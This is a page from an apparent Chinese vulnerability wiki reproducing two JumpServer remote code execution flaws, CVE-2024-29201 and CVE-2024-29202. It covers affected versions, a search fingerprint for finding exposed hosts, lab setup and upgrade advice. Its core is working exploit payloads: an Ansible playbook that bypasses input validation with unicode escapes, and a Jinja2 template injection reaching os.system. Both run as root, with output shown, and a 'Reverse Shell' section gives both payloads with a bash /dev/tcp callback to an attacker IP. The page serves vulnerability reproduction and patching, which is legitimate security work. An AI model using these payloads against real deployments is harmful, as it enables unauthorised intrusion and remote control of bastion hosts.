<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>JumpServer 远程代码执行漏洞 CVE-2024-29201&amp;CVE-2024-29202 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "JumpServer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2024-29201\u0026amp;CVE-2024-29202", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_4" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_8" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_9" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Jupyter Notebook 未授权访问远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        JumpServer 未授权接口 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="jumpserver-cve-2024-29201cve-2024-29202">JumpServer 远程代码执行漏洞 CVE-2024-29201&amp;CVE-2024-29202<a class="headerlink" href="#jumpserver-cve-2024-29201cve-2024-29202" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>JumpServer 是使用广泛的开源堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 规范的运维安全审计系统。</p>
<ul>
<li>CVE-2024-29201 远程代码执行漏洞：由于 JumpServer 中的 Ansible 模块未进行完整的输入验证，具有低权限账户的攻击者可以绕过输入验证机制在 Celery 容器中执行任意代码，并从主机中窃取敏感信息或操纵数据库。</li>
<li>CVE-2024-29202 Jinjia2 模板注入漏洞：经过身份验证的攻击者可以通过构建恶意 playbook 模板，利用 Ansible 中的 Jinja2 模板引擎在 Celery 容器中执行任意代码，并从主机中窃取敏感信息或操纵数据库。</li>
</ul>
<p><strong>两个漏洞利用的条件都需要账号且至少有一个资产</strong>。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj</a></li>
<li><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch</a></li>
<li><a href="https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/">https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/</a></li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>v3.0.0 &lt;= JumpServer &lt;= v3.10.6
</code></pre></div>
<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>app=&quot;JumpServer-Bastion-Host&quot;
</code></pre></div>
<h2 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>下载官方提供的 <a href="https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh">脚本</a>，编辑 <code>quick_start.sh</code>，将脚本中的 <code>VERSION</code> 修改为存在漏洞版本，如：<code>V3.10.6</code>。</p>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613091657786.png" /></p>
<p>环境启动后，访问 <code>http://your-ip</code> 即可看到 JumpServer 首页，默认账号密码 <code>admin/admin</code>。默认密码登陆后，JumpServer 将强制要求用户修改密码。</p>
<h3 id="_5">创建用户<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>用户管理 → 用户列表 → 创建
</code></pre></div>
<p>创建用户 <code>threekiii</code>，后续将使用该账户进行攻击操作：</p>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613103551513.png" /></p>
<h3 id="_6">添加资产<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>准备一个 Linux 资产：</p>
<div class="highlight"><pre><span></span><code>[IP Address]         192.168.43.169
[Username/Password]  kali/kali
</code></pre></div>
<p>将这个 Linux 资产添加到资产列表，命名为 <code>test</code>：</p>
<div class="highlight"><pre><span></span><code>资产管理 → 资产列表 → 创建
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613103706622.png" /></p>
<p>添加完成后，点击更新，添加账号 <code>kali</code> 并配置密码为 <code>kali</code>：</p>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613103755148.png" /></p>
<p>点击测试，以测试配置是否成功：</p>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613104139395.png" /></p>
<h3 id="_7">授权资产<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>将上一步添加的资产 <code>test</code> 授权给用户 <code>threekiii</code>：</p>
<div class="highlight"><pre><span></span><code>权限管理 → 资产授权 → 创建
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613104543397.png" /></p>
<h2 id="_8">漏洞复现<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
<h3 id="cve-2024-29201">CVE-2024-29201<a class="headerlink" href="#cve-2024-29201" title="Permanent link">&para;</a></h3>
<p>以攻击者用户 <code>threekiii</code> 登录 JumpServer，切换到工作台，创建 Playbook，命名为 <code>CVE-2024-29201</code>：</p>
<div class="highlight"><pre><span></span><code>作业中心 → 模板管理 → Playbook管理 → 创建 → 创建playbook
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613104951909.png" /></p>
<p>点击创建的 Playbook 名称 <code>CVE-2024-29201</code>，切换到工作空间，输入以下内容，保存：</p>
<div class="highlight"><pre><span></span><code>[{
     &quot;name&quot;: &quot;RCE playbook&quot;,
     &quot;hosts&quot;: &quot;all&quot;,
     &quot;tasks&quot;: [
       {
         &quot;name&quot;: &quot;this runs in Celery container&quot;,
         &quot;shell&quot;: &quot;id &gt; /tmp/awesome_poc&quot;,
         &quot;\u0064elegate_to&quot;: &quot;localhost&quot;
} ],
     &quot;vars&quot;: {
     &quot;ansible_\u0063onnection&quot;: &quot;local&quot;
     }
}]
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613105044366.png" /></p>
<p>切换到作业管理，创建一个新的 Playbook 作业：</p>
<div class="highlight"><pre><span></span><code>作业中心 → 作业管理 → 创建 → Playbook作业
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613105325676.png" /></p>
<p>点击提交，运行作业：</p>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613105423507.png" /></p>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613105455637.png" /></p>
<p>进入 Celery 容器，成功在 <code>/tmp</code> 目录下创建 <code>awesome_poc</code> 文件：</p>
<div class="highlight"><pre><span></span><code>root@jms_celery:/opt/jumpserver# ls /tmp
artifacts  awesome_poc  local.pid  worker_heartbeat_ansible  worker_heartbeat_celery  worker_ready_ansible  worker_ready_celery

root@jms_celery:/opt/jumpserver# cat /tmp/awesome_poc
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613105647162.png" /></p>
<h3 id="cve-2024-29202">CVE-2024-29202<a class="headerlink" href="#cve-2024-29202" title="Permanent link">&para;</a></h3>
<p>以攻击者用户 <code>threekiii</code> 登录 JumpServer，切换到工作台，创建 Playbook，命名为 <code>CVE-2024-29202</code>：</p>
<div class="highlight"><pre><span></span><code>作业中心 → 模板管理 → Playbook管理 → 创建 → 创建playbook
</code></pre></div>
<p>点击创建的 Playbook 名称 <code>CVE-2024-29202</code>，切换到工作空间，输入以下内容，保存：</p>
<div class="highlight"><pre><span></span><code>- name: |
       {% for x in ().__class__.__base__.__subclasses__() %}
         {% if &quot;warning&quot; in x.__name__ %}
           {{
             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;id &gt; /tmp/awesome_poc_2&quot;)
           }}
         {%endif%}
       {%endfor%}
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613105850209.png" /></p>
<p>切换到作业管理，创建一个新的 Playbook 作业：</p>
<div class="highlight"><pre><span></span><code>作业中心 → 作业管理 → 创建 → Playbook作业
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613110023524.png" /></p>
<p>点击提交，运行作业，报错不影响执行：</p>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613110939724.png" /></p>
<p>进入 Celery 容器，成功在 <code>/tmp</code> 目录下创建 <code>awesome_poc_2</code> 文件：</p>
<div class="highlight"><pre><span></span><code>root@jms_celery:/opt/jumpserver# ls /tmp
artifacts  awesome_poc  awesome_poc_2  local.pid  worker_heartbeat_ansible  worker_heartbeat_celery  worker_ready_ansible  worker_ready_celery
root@jms_celery:/opt/jumpserver# cat /tmp/awesome_poc_2 
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.168.250.7   jms_celery
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613110908696.png" /></p>
<h3 id="reverse-shell">Reverse Shell<a class="headerlink" href="#reverse-shell" title="Permanent link">&para;</a></h3>
<p>CVE-2024-29201 payload：</p>
<div class="highlight"><pre><span></span><code>[{
     &quot;name&quot;: &quot;RCE playbook&quot;,
     &quot;hosts&quot;: &quot;all&quot;,
     &quot;tasks&quot;: [
       {
         &quot;name&quot;: &quot;this runs in Celery container&quot;,
         &quot;shell&quot;: &quot;bash -i &gt;&amp; /dev/tcp/your-ip/8888 0&gt;&amp;1&quot;,
         &quot;\u0064elegate_to&quot;: &quot;localhost&quot;
} ],
     &quot;vars&quot;: {
     &quot;ansible_\u0063onnection&quot;: &quot;local&quot;
     }
}]
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613111436756.png" /></p>
<p>CVE-2024-29202 payload：</p>
<div class="highlight"><pre><span></span><code>- name: |
       {% for x in ().__class__.__base__.__subclasses__() %}
         {% if &quot;warning&quot; in x.__name__ %}
           {{
             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;bash -i &gt;&amp; /dev/tcp/your-ip/8888 0&gt;&amp;1&quot;)
           }}
         {%endif%}
       {%endfor%}
</code></pre></div>
<p><img alt="" src="../images/JumpServer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-29201%26CVE-2024-29202/image-20240613111209119.png" /></p>
<h2 id="_9">漏洞修复<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
<ol>
<li>升级到 v3.10.7 版本。目前官方已在最新版本中修复了上述漏洞，下载链接： <a href="https://github.com/jumpserver/jumpserver/releases">https://github.com/jumpserver/jumpserver/releases</a>。</li>
<li>关闭任务中心，任务中心位于：系统设置 - 功能设置 - 任务中心。</li>
</ol>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Jupyter Notebook 未授权访问远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        JumpServer 未授权接口 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>